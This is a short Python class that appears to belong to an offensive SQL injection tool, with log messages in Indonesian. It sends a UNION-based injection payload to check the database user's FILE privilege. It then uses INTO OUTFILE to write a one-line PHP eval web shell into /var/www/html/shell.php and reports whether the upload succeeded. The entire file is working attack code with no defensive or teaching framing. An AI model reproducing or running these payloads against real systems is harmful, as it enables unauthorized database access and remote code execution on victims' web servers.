class OSShell:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args

    def run(self):
        check = self.req.get_text("' UNION SELECT 1,GROUP_CONCAT(privilege_type),3 FROM information_schema.user_privileges WHERE grantee=CONCAT('\\'',CURRENT_USER(),'\\'@\\'%\\'')-- -")
        if "FILE" in check:
            self.logger.success("FILE privilege aktif, coba upload shell")
            shell = "<?php @eval($_POST['x']); ?>"
            payload = f"' UNION SELECT 1,'{shell}',3 INTO OUTFILE '/var/www/html/shell.php'-- -"
            resp = self.req.get_text(payload)
            if "error" not in resp.lower():
                self.logger.success("Shell terupload: /shell.php")
            else:
                self.logger.warn("Upload shell gagal")
        else:
            self.logger.info("Tidak ada FILE privilege")
